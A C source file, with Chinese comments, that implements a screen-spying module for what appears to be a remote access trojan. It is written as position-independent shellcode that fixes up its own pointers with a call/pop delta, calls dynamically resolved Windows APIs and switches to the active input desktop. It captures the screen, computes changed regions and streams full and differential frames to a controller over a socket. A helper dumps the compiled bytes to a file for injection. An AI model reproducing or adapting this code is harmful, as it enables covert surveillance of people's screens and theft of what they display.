#include "global_data.h"
#include "shellcodes.h"

/*
  最小块大小为 32 * 38
  BitBlt 不加上 CAPTUREBLT无法捕获透明窗体
  但CAPTUREBLT会导致鼠标闪烁
  仅使用SRCCOPY标志时，Windows只需要从M中拷贝屏幕图像就行了。而若使用了CAPTUREBLT标志，导致的结果是鼠标及半透明窗口均被捕捉下来。
  但在设计上，BitBlt函数是不允许捕捉鼠标的。于是，系统只好先隐藏鼠标，然后捕捉图像，再恢复鼠标，结果就导致了鼠标的闪烁。
*/

extern void __cdecl screenspy_entry(global_data_t *global_data);
extern bool __cdecl switch_input_desktop(global_data_t *global_data);
extern int __cdecl screenspy_initalize(global_data_t *global_data, SOCKET s, int bit_count);
extern void __cdecl screenspy_save_rect(global_data_t *global_data, RECT rt);
extern int __cdecl screenspy_send_diff(global_data_t *global_data, SOCKET s);
extern int __cdecl screenspy_send(global_data_t *global_data, SOCKET s);
extern int __cdecl screenspy_finalize(global_data_t *global_data, SOCKET s);
extern void __cdecl screenspy_code_end();

#define FIX(name) xscreenspy.##name = (_##name)(delta + (char *)name)

#pragma optimize("ts", on)

void __cdecl screenspy_entry(global_data_t *global_data) {
  uint32_t delta;

  __asm {
    call x;
  x:
    pop	eax;
    sub	eax, offset x;
    mov	delta, eax
  }

  FIX(screenspy_initalize);
  FIX(screenspy_send);
  FIX(screenspy_finalize);
}

#undef FIX  // undef macro FIX

// 切换输入窗口
bool __cdecl switch_input_desktop(global_data_t *global_data) {
  bool	ret = false;
  DWORD	needed;

  HDESK	old, new_;
  char	current[256], input[256];

  old = xGetThreadDesktop(xGetCurrentThreadId());
  zero_memory(current, sizeof(current));
  xGetUserObjectInformationA(old, UOI_NAME, &current, sizeof(current), &needed);

  new_ = xOpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
  zero_memory(current, sizeof(input));
  xGetUserObjectInformationA(new_, UOI_NAME, &input, sizeof(input), &needed);

  if (xlstrcmpiA(input, current) != 0) {
    xSetThreadDesktop(new_);
    ret = true;
  }
  xCloseDesktop(old);

  xCloseDesktop(new_);

  return ret;
}

int __cdecl screenspy_initalize(global_data_t *global_data, SOCKET s, int bit_count) {
  extra_data()->state |= STATE_SCREEN_SPY;

  xscreenspy.screen_width = xGetSystemMetrics(SM_CXSCREEN);
  xscreenspy.screen_height = xGetSystemMetrics(SM_CYSCREEN);

  switch_input_desktop(global_data);

  xscreenspy.desktop_window = xGetDesktopWindow();
  xscreenspy.desktop_dc = xGetDC(xscreenspy.desktop_window);

  xscreenspy.bitmap_full = xbitmap_new(xscreenspy.desktop_dc, bit_count, xscreenspy.screen_width, 
  xscreenspy.screen_height);
  xscreenspy.bitmap_line = xbitmap_new(xscreenspy.desktop_dc, bit_count, xscreenspy.screen_width, 1);

  xscreenspy.bit_count = xscreenspy.bitmap_full->bit_count;

  xscreenspy.start_line = 0;
  xscreenspy.first_screen_sent = false;

  return xsend_packet(s, CMD_SCREENSPY_START, 0, 0);
}

void __cdecl screenspy_save_rect(global_data_t *global_data, RECT rt) {
  int i, j;
  RECT rt3;
  int nt[9];

  for (i = 0; i < 9; i++) {
    //  找出非空数据
    if (xscreenspy.changed[i].right == 0) continue;

    // 判断当前区域是否与已经保存的区域中间的区域是否足以放下另外一个基本块
    if ((xscreenspy.changed[i].left - rt.right > 32) ||
      (rt.left - xscreenspy.changed[i].right > 32) ||
      (xscreenspy.changed[i].top - rt.bottom > 38) ||
      (xscreenspy.changed[i].top - rt.bottom > 38)) {
      continue;
    }
    else {
      xSetRect(&xscreenspy.changed[i], min(xscreenspy.changed[i].left, rt.left), min(xscreenspy.changed[i].top, rt.top),
        max(xscreenspy.changed[i].right, rt.right), max(xscreenspy.changed[i].bottom, rt.bottom));
      return;
    }
  }

  //  计算扩充后的大小
  for (i = 0; i < 9; i++) {
    nt[i] = 0;
    if (xscreenspy.changed[i].right == 0) continue;

    xSetRect(&rt3, min(xscreenspy.changed[i].left, rt.left), min(xscreenspy.changed[i].top, rt.top),
      max(xscreenspy.changed[i].right, rt.right), max(xscreenspy.changed[i].bottom, rt.bottom));

    //  这个公式就是计算扩展后的Rect所占用的冗余区域字节大小
    //  写到一起会导致崩溃，wtf!
    int target = (rt3.right - rt3.left) * (rt3.bottom - rt3.top);
    int orign = (xscreenspy.changed[i].right - xscreenspy.changed[i].left) * (xscreenspy.changed[i].bottom - xscreenspy.changed[i].top);
    int input = (rt.right - rt.left) * (rt.bottom - rt.top);

    j = (target - orign - input) * xscreenspy.bit_count / 8;
    //  如果占用的冗余字节数小于3000则直接设置
    if (j < 3000) {
      xscreenspy.changed[i] = rt3;
      return;
    }

    //  保存冗余信息
    nt[i] = j;
  }

  //  有空位置直接保存
  for (i = 0; i < 9; i++) {
    if (xscreenspy.changed[i].right == 0) {
      xscreenspy.changed[i] = rt;
      return;
    }
  }

  // 找出扩充后字节数最小的区域来进行扩充
  i = 0;
  for (j = 0; j < 9; j++) {
    if (xscreenspy.changed[i].right == 0) continue;

    if (nt[j] < nt[i]) i = j;
  }

  xSetRect(&xscreenspy.changed[i], min(xscreenspy.changed[i].left, rt.left), min(xscreenspy.changed[i].top, rt.top),
    max(xscreenspy.changed[i].right, rt.right), max(xscreenspy.changed[i].bottom, rt.bottom));
}

int __cdecl screenspy_send_diff(global_data_t *global_data, SOCKET s) {
  int i, j;
  uint32_t *porign, *pnew;
  RECT rt;

  for (i = 0; i < 9; i++) {
    xSetRectEmpty(&xscreenspy.changed[i]);
  }

  xSetRectEmpty(&rt);

  i = xscreenspy.start_line;
  while (i < xscreenspy.screen_height) {
    //  取出一行数据
    xBitBlt(xscreenspy.bitmap_line->dc, 0, 0, xscreenspy.screen_width, 1, xscreenspy.desktop_dc, 0, i, SRCCOPY/* | CAPTUREBLT*/);

    porign = xbitmap_scan_line(xscreenspy.bitmap_full, i);
    pnew = xbitmap_scan_line(xscreenspy.bitmap_line, 0);

    j = 0;
    while (j < xscreenspy.screen_width) {
      if (*porign == *pnew) {
        porign++;
        pnew++;
        j += 32 / xscreenspy.bit_count; // 32位除以一个像素占多少位
        continue;
      }

      rt.left = max(j - 32, 0);
      rt.top = max(i - 19, 0);
      rt.right = min(j + 32, xscreenspy.screen_width);
      rt.bottom = min(i + 19, xscreenspy.screen_height);

      screenspy_save_rect(global_data, rt);

      // 这里加bit_count是因为32(像素) / (32(一个dword包含多少位) / bitcount(一个像素占用多少位)) = bit_count
      porign += xscreenspy.bit_count;
      pnew += xscreenspy.bit_count;
      j += 32;
    }

    i += 19;
  }

  // 0 3 6 9 12 15 18， 2 5 8 11 14 17， 1 4 7 10 13 16 0,
  // 为了防止每次都从第一个进行扫描，每次跳过的行数都是相同的，以免特定行数改变时无法捕获
  // 保证每行都能被扫描到
  xscreenspy.start_line = (xscreenspy.start_line + 3) % 19;

  // 将变化的区域写入原图
  for (i = 0; i < 9; i++) {
    if (xscreenspy.changed[i].right != 0) {
      xBitBlt(xscreenspy.bitmap_full->dc, 
        xscreenspy.changed[i].left, xscreenspy.changed[i].top, 
        xscreenspy.changed[i].right - xscreenspy.changed[i].left,
        xscreenspy.changed[i].bottom - xscreenspy.changed[i].top,
        xscreenspy.desktop_dc, xscreenspy.changed[i].left, xscreenspy.changed[i].top, SRCCOPY);
    }
  }

  // 发送变化的区域
  buffer_t *buf = xbuffer_new();
  POINT pt;
  int width, height;

  // 写入当前鼠标指针
  xGetCursorPos(&pt);
  xbuffer_write(buf, &pt, sizeof(pt));

  for (i = 0; i < 9; i++) {
    if (xscreenspy.changed[i].right != 0) {
      pt.x = xscreenspy.changed[i].left;
      pt.y = xscreenspy.changed[i].top;

      // 写入图像坐标
      xbuffer_write(buf, &pt, sizeof(pt));

      width = xscreenspy.changed[i].right - xscreenspy.changed[i].left;
      height = xscreenspy.changed[i].bottom - xscreenspy.changed[i].top;

      bitmap_t *changed_bitmap = xbitmap_new(xscreenspy.bitmap_full->dc, xscreenspy.bit_count, width, height);

      xBitBlt(changed_bitmap->dc, 0, 0, width, height, xscreenspy.bitmap_full->dc, xscreenspy.changed[i].left, xscreenspy.changed[i].top, SRCCOPY);

      xbitmap_save(changed_bitmap, buf);

      xbitmap_free(changed_bitmap);
    }
  }

  int ret = xsend_packet(s, CMD_SCREENSPY_DATA, (const char *)buf->data, buf->size);

  xbuffer_free(buf);

  return ret;
}

int __cdecl screenspy_send(global_data_t *global_data, SOCKET s) {
  // 判断时间
  /*DWORD temp = xGetTickCount();
  if (temp - xscreenspy.tick < 1000 / 60) {
    return 0;
  }
  xscreenspy.tick = temp;*/

  if (switch_input_desktop(global_data)) {
    xReleaseDC(xscreenspy.desktop_window, xscreenspy.desktop_dc);
    xscreenspy.desktop_window = xGetDesktopWindow();
    xscreenspy.desktop_dc = xGetDC(xscreenspy.desktop_window);
  }

  if (xscreenspy.first_screen_sent)
    return screenspy_send_diff(global_data, s);

  xBitBlt(xscreenspy.bitmap_full->dc, 0, 0, xscreenspy.screen_width, xscreenspy.screen_height, xscreenspy.desktop_dc, 0, 0, SRCCOPY/* | CAPTUREBLT*/);

  buffer_t *buf = xbuffer_new();
  POINT pt;

  // 写入当前鼠标位置
  xGetCursorPos(&pt);
  xbuffer_write(buf, &pt, sizeof(pt));
  // 写入图像位置
  pt.x = 0;
  pt.y = 0;
  xbuffer_write(buf, &pt, sizeof(pt));
  xbitmap_save(xscreenspy.bitmap_full, buf);

  int ret = xsend_packet(s, CMD_SCREENSPY_DATA, (const char *)buf->data, buf->size);

  xbuffer_free(buf);

  xscreenspy.first_screen_sent = true;

  return ret;
}

int __cdecl screenspy_finalize(global_data_t *global_data, SOCKET s) {
  extra_data()->state &= ~STATE_SCREEN_SPY;;

  xReleaseDC(xscreenspy.desktop_window, xscreenspy.desktop_dc);

  xbitmap_free(xscreenspy.bitmap_full);
  xbitmap_free(xscreenspy.bitmap_line);

  if (s != INVALID_SOCKET) {
    return xsend_packet(s, CMD_SCREENSPY_END, 0, 0);
  }

  return 0;
}

void __cdecl screenspy_code_end() {
  printf(__FUNCTION__);
}

#pragma optimize("ts", off)

#undef FIX             // undef macro FIX

void screenspy_save(char *filename) {
  char *start, *end;
  FILE *f;

  start = (char *)screenspy_entry;
  end = (char *)screenspy_code_end;

  printf("[*] screenspy code size = 0x%X\n", end - start);

  f = fopen(filename, "wb");
  fwrite(start, 1, end - start, f);

  fclose(f);
  printf("[*] save screenspy to %s success.\n", filename);
}